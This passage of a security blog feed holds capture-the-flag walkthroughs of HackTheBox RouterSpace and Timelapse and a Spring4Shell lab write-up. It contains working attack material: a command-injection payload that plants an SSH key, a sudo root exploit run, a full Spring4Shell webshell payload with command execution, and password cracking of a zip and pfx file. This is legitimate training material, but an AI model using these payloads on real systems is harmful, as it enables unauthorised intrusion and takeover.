64240, options [mss 1460,sackOK,TS val 1432270006 ecr 0,nop,wscale 7], length 0</span><br><span class="line">01:08:51.313977 IP routerspace.htb.http &gt; infosec.52882: Flags [S.], <span class="built_in">seq</span> 2413504831, ack 2011016044, win 65160, options [mss 1285,sackOK,TS val 79265623 ecr 1432270006,nop,wscale 7], length 0</span><br><span class="line">01:08:51.314012 IP infosec.52882 &gt; routerspace.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1432270048 ecr 79265623], length 0</span><br><span class="line">01:08:51.314181 IP infosec.52882 &gt; routerspace.htb.http: Flags [P.], <span class="built_in">seq</span> 1:286, ack 1, win 502, options [nop,nop,TS val 1432270048 ecr 79265623], length 285: HTTP: POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1</span><br><span class="line">01:08:51.354819 IP routerspace.htb.http &gt; infosec.52882: Flags [.], ack 286, win 507, options [nop,nop,TS val 79265664 ecr 1432270048], length 0</span><br><span class="line">01:08:51.359955 IP routerspace.htb.http &gt; infosec.52882: Flags [P.], <span class="built_in">seq</span> 1:252, ack 286, win 507, options [nop,nop,TS val 79265669 ecr 1432270048], length 251: HTTP: HTTP/1.1 200 OK</span><br><span class="line">01:08:51.359973 IP infosec.52882 &gt; routerspace.htb.http: Flags [.], ack 252, win 501, options [nop,nop,TS val 1432270094 ecr 79265669], length 0</span><br><span class="line">01:08:51.360218 IP routerspace.htb.http &gt; infosec.52882: Flags [F.], <span class="built_in">seq</span> 252, ack 286, win 507, options [nop,nop,TS val 79265669 ecr 1432270048], length 0</span><br><span class="line">01:08:51.361783 IP infosec.52882 &gt; routerspace.htb.http: Flags [F.], <span class="built_in">seq</span> 286, ack 253, win 501, options [nop,nop,TS val 1432270096 ecr 79265669], length 0</span><br><span class="line">01:08:51.402351 IP routerspace.htb.http &gt; infosec.52882: Flags [.], ack 287, win 507, options [nop,nop,TS val 79265712 ecr 1432270096], length 0</span><br><span class="line">10 packets captured</span><br><span class="line">10 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><p>let try some command</p><p><a href="https://imgur.com/5CXtDQ6" title="5CXtDQ6">5CXtDQ6</a></p><p>It was successful.</p><p>create a listener on port 1234</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnkp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br></pre></td></tr></table></figure><p>then send a request with a bash reverse shell payload, and it fails</p><p>I looked for the ssh key but couldn’t find it.</p><p>As a result, I added my ssh public key to the target machine.</p><p>POST &#x2F;api&#x2F;v4&#x2F;monitoring&#x2F;router&#x2F;dev&#x2F;check&#x2F;deviceAccess HTTP&#x2F;1.1<br>accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>user-agent: RouterSpaceAgent<br>Content-Type: application&#x2F;json<br>Content-Length: 619<br>Host: routerspace.htb<br>Connection: close<br>Accept-Encoding: gzip, deflate</p><p>{“ip”:”10.10.14.xx; echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNapKa7+twt&#x2F;vE+t5fhsRMPjDHOdfCUG38FYPU32PxD5nRUD5mi281AXHru1ebX2n&#x2F;wStOrFFmIDyjW4&#x2F;Zd0BZASoD+MXcERwTMgFtBYFGh+5Oy1cUJaM&#x2F;0otHY7tCTk&#x2F;vqqpaRV&#x2F;PS9Qo18qtpBsI6nUFEFzBpJGqiWjxCdKMQ15Dxgyd0&#x2F;D7jnZZD7GslYPXR&#x2F;PfxEu4bkSrltA4tAG0JP02H52m6XP1j8Ysv8dccB&#x2F;Ps5ir6X3g9bLOciTTP7wvtVVEtRqF2Q0Avp8c5Ef14Rd9JUWJcYDYk3Qxep09QsujbT4oNgBotnaslge+kpBykfp9esi6v8jWcQcs+zWNYephKlE&#x2F;Ufp7HpnM1qWjiTxC1dSbU5knegKyaqSJB6XiItkh2yagt+hERMmqAFwW6mOhIYImHdaRWEbymJMOhRc8VbZubxCw6S88WIkgvcEh7NauLr7KgGC0KGQepMt&#x2F;TyQQC6w+GZTKgUpbdco7loEmYaXJmjjdomqale8ItGM&#x3D; root@infosec’ &gt; ~&#x2F;.ssh&#x2F;authorized_keys”}</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ssh paul@routerspace.htb </span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management: https://landscape.canonical.com</span><br><span class="line"> * Support:https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue 19 Apr 2022 02:19:35 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:   0.08</span><br><span class="line">  Usage of /:70.7% of 3.49GB</span><br><span class="line">  Memory usage:  16%</span><br><span class="line">  Swap usage:0%</span><br><span class="line">  Processes: 223</span><br><span class="line">  Users logged <span class="keyword">in</span>:   0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.10.11.148</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:9e4e</span><br><span class="line"></span><br><span class="line"> * Super-optimized <span class="keyword">for</span> small spaces - <span class="built_in">read</span> how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">80 updates can be applied immediately.</span><br><span class="line">31 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133</span><br><span class="line">paul@routerspace:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">eba216e20a9938dc19f08cbb7eb4xxxx</span><br><span class="line">paul@routerspace:~$ </span><br></pre></td></tr></table></figure><p>got user flag</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>After running the linpeas.sh script,</p><p>It indicates that sudo version is vulnerable</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:~$ sudo --version</span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br></pre></td></tr></table></figure><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" title="CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)">https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><p>I used this repo <a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git" title="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git</span><br><span class="line">Cloning into <span class="string">&#x27;Sudo-1.8.31-Root-Exploit&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 9, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (9/9), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (7/7), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0</span><br><span class="line">Receiving objects: 100% (9/9), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>Copy the exploit files to the target machine and run the exploit file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r Sudo-1.8.31-Root-Exploit paul@routerspace.htb:/tmp/sudo</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:~$ <span class="built_in">cd</span> /tmp/sudo/</span><br><span class="line">paul@routerspace:/tmp/sudo$ make</span><br><span class="line"><span class="built_in">mkdir</span> libnss_x</span><br><span class="line">cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c</span><br><span class="line">cc -O3 -o exploit exploit.c</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:/tmp/sudo$ ./exploit </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1001(paul)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">0600eed8a854681276020a878a84xxxx</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">RouterSpace was an easy box from hackthebox.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="rce" scheme="https://mdn1nj4.github.io/tags/rce/"/>
    
    <category term="android" scheme="https://mdn1nj4.github.io/tags/android/"/>
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
    <category term="exploit" scheme="https://mdn1nj4.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-22965 - Build and Exploit</title>
    <link href="https://mdn1nj4.github.io/CVE/cve-2022-22965-build-and-attack/"/>
    <id>https://mdn1nj4.github.io/CVE/cve-2022-22965-build-and-attack/</id>
    <published>2022-04-06T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.<br>Read more: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" title="link">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><h2 id="Build-the-application"><a href="#Build-the-application" class="headerlink" title="Build the application"></a>Build the application</h2><p>This docker image contains a Spring Boot web application which is vulnerable to CVE-2022-22965.</p><p>A vulnerable configuration consists of:<br>JDK version 9+<br>Apache Tomcat for serving the application<br>Spring Framework versions 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19 and below<br>application built as a WAR file</p><p>Pull the docker image</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>Then run the below command to deploy the web app</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --<span class="built_in">rm</span> --name spring_rce -p 8080:8080 vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>curl the localhost:8080 to confirm the application is running or not.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost:8080 -v </span><br><span class="line">*   Trying 127.0.0.1:8080...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* Connected to localhost (127.0.0.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: localhost:8080</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 </span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 2</span><br><span class="line">&lt; Date: Thu, 07 Apr 2022 12:01:10 GMT</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host localhost left intact</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Download the exploit script from github. i’m using this : <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC" title="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>But there is lots of exploit script available for this vulnerability in github.</p><p>Here is the payload used in this python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(self.url,</span><br><span class="line">                          headers=headers,</span><br><span class="line">                          data=data,</span><br><span class="line">                          timeout=<span class="number">15</span>,</span><br><span class="line">                          allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                          verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>run this command to inject the webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $ git <span class="built_in">clone</span> https://github.com/BobTheShoplifter/Spring4Shell-POC.git</span><br><span class="line">Cloning into <span class="string">&#x27;Spring4Shell-POC&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 297, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (297/297), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (245/245), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 297 (delta 100), reused 109 (delta 27), pack-reused 0</span><br><span class="line">Receiving objects: 100% (297/297), 16.45 MiB | 7.90 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (100/100), <span class="keyword">done</span>.</span><br><span class="line">$ <span class="built_in">cd</span> Spring4Shell-POC/</span><br><span class="line">$ <span class="built_in">chmod</span> +x poc.py </span><br><span class="line">$ ./poc.py  --url http://localhost:8080/</span><br><span class="line">Vulnerable，shell url: http://localhost:8080/tomcatwar.jsp?<span class="built_in">pwd</span>=j&amp;cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>the script successfully injected the webshell in the server.</p><p>just curl the url : <strong><a href="http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id">http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id&#x27;</span> --output -</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br></pre></td></tr></table></figure><p>Reference: <a href="https://github.com/itsecurityco/CVE-2022-22965" title="https://github.com/itsecurityco/CVE-2022-22965">https://github.com/itsecurityco/CVE-2022-22965</a></p>]]></content>
    
    
    <summary type="html">A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.</summary>
    
    
    
    <category term="CVE" scheme="https://mdn1nj4.github.io/categories/CVE/"/>
    
    
    <category term="spring-core" scheme="https://mdn1nj4.github.io/tags/spring-core/"/>
    
    <category term="java" scheme="https://mdn1nj4.github.io/tags/java/"/>
    
    <category term="CVE-2022-22965" scheme="https://mdn1nj4.github.io/tags/CVE-2022-22965/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Timelapse Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-timelapse-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-timelapse-writeup/</id>
    <published>2022-03-31T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>OS: Windows<br>Difficulty: Easy<br>Points: 20<br>Release: 26 Mar 2022<br>IP: 10.10.11.152</strong></p><p>Timelapse was an easy machine from HackTheBox. We need some basic enumeration and crack and extract the cert from pfx file to get the user flag.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="nmap-scanning-result"><a href="#nmap-scanning-result" class="headerlink" title="nmap scanning result"></a>nmap scanning result</h3><pre><code># Nmap 7.92 scan initiated Sun Mar 27 07:29:04 2022 as: nmap -sC -sV -vvv -oN scan.nmap 10.10.11.152Nmap scan report for 10.10.11.152Host is up, received echo-reply ttl 127 (0.100s latency).Scanned at 2022-03-27 07:29:05 UTC for 67sNot shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE           REASON          VERSION53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-03-27 15:29:18Z)135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?     syn-ack ttl 127464/tcp  open  kpasswd5?         syn-ack ttl 127593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  ldapssl?          syn-ack ttl 1273268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open  globalcatLDAPssl? syn-ack ttl 127Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| p2p-conficker: |   Checking for Conficker.C or higher...|   Check 1 (port 20407/tcp): CLEAN (Timeout)|   Check 2 (port 32357/tcp): CLEAN (Timeout)|   Check 3 (port 44242/udp): CLEAN (Timeout)|   Check 4 (port 22941/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: 7h59m58s| smb2-time: |   date: 2022-03-27T15:29:29|_  start_date: N/A| smb2-security-mode: |   3.1.1: |_    Message signing enabled and requiredRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Mar 27 07:30:12 2022 -- 1 IP address (1 host up) scanned in 68.08 seconds</code></pre><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>I try some basic attack on the smb like null session injection and it worked and i have access to the shares. There is two directory in shares</p><pre><code>#smbclient -L //10.10.11.152/                                                                                                                    Enter WORKGROUP\GUEST&#39;s password:                                                                                                                                                                                                                                                                                   Sharename       Type      Comment                                                                                                                     ---------       ----      -------                                                                                                                     ADMIN$          Disk      Remote Admin                                                                                                                C$              Disk      Default share        IPC$            IPC       Remote IPC        NETLOGON        Disk      Logon server share         Shares          Disk              SYSVOL          Disk      Logon server share SMB1 disabled -- no workgroup available</code></pre><p>Then i Downloaded all files in the smb shares.</p><pre><code>#smbclient //10.10.11.152/sharesEnter WORKGROUP\GUEST&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls Dev/  .                                   D        0  Mon Oct 25 19:40:06 2021  ..                                  D        0  Mon Oct 25 19:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021                6367231 blocks of size 4096. 1537388 blocks availablesmb: \&gt; ls HelpDesk\  .                                   D        0  Mon Oct 25 15:48:42 2021  ..                                  D        0  Mon Oct 25 15:48:42 2021  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021                6367231 blocks of size 4096. 1537388 blocks available</code></pre><p>I read all the documents.</p><p>after that i try to decompress the winrm_backup.zip file.</p><pre><code>#unzip winrm_backup.zip Archive:  winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password:    skipping: legacyy_dev_auth.pfx    incorrect password</code></pre><p>then crack the zip file.</p><pre><code>#fcrackzip -D -p ../rockyou.txt -u winrm_backup.zip                    found file &#39;legacyy_dev_auth.pfx&#39;, (size cp/uc   2405/  2555, flags 9, chk 72aa)PASSWORD FOUND!!!!: pw == supremelegacy</code></pre><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>zip file  name is winrm_backup.zip</p><p>i must to used to authenticate in winrm then i did a quick google search on what i can do with the pfx file i found some here <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" title="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p><pre><code>#openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out login.key   Enter Import Password:Can&#39;t read Password</code></pre><p>so we need to crack certificate password</p><p>i used crackpkcs12</p><pre><code>#crackpkcs12 -d ../rockyou.txt legacyy_dev_auth.pfx Dictionary attack - Starting 4 threads*********************************************************Dictionary attack - Thread 3 - Password found: thuglegacy*********************************************************</code></pre><p>Extract the private and public key</p><pre><code>#openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out login.key                                                                                 Enter Import Password:                                                                                                                                Enter PEM pass phrase:                                                                                                                                Verifying - Enter PEM pass phrase:#openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt                                                                          Enter Import Password:</code></pre><p>Login with evil-winrm</p><pre><code>#evil-winrm -S -k login.key -c cert.crt -i 10.10.11.152                Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpointEnter PEM pass phrase:*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; </code></pre><p>Get the user flag</p><pre><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd ..*Evil-WinRM* PS C:\Users\legacyy&gt; tree /fFolder PATH listingVolume serial number is 22CC-AE66C:.____Desktop_       user.txt_____Documents____Downloads____Favorites____Links____Music____Pictures____Saved Games____Videos*Evil-WinRM* PS C:\Users\legacyy&gt; cat Desktop/user.txt56146e0ef****************</code></pre><h2 id="Priv-Esc"><a href="#Priv-Esc" class="headerlink" title="Priv Esc"></a>Priv Esc</h2><p>user svc_deploy is in group LAPS_Readers</p><pre><code>*Evil-WinRM* PS C:\Users&gt; ls                                                                                                                                                                                                                                                                                                                                                                                                                                          Directory: C:\Users                       